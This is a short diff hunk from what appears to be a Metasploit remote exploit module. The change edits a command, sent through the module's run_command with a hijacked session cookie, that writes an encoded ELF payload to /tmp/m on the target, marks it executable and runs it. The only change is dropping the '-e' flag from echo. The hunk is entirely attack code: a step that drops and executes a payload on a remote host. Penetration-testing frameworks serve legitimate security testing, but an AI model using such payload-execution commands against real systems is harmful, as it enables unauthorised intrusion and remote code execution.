@@ -194,7 +194,7 @@ class MetasploitModule < Msf::Exploit::Remote
 			vprint_status("encoded_elf = #{encoded_elf}")
 
 			# upload elf to /tmp/m , chmod +rx /tmp/m , then run /tmp/m (payload)
-                        run_command(user, swap_cookie, ("echo -e \"#{encoded_elf}\"\>/tmp/m\;chmod +rx /tmp/m\;/tmp/m"))
+                        run_command(user, swap_cookie, ("echo \"#{encoded_elf}\"\>/tmp/m\;chmod +rx /tmp/m\;/tmp/m"))
 			
 
 			# wait for magic
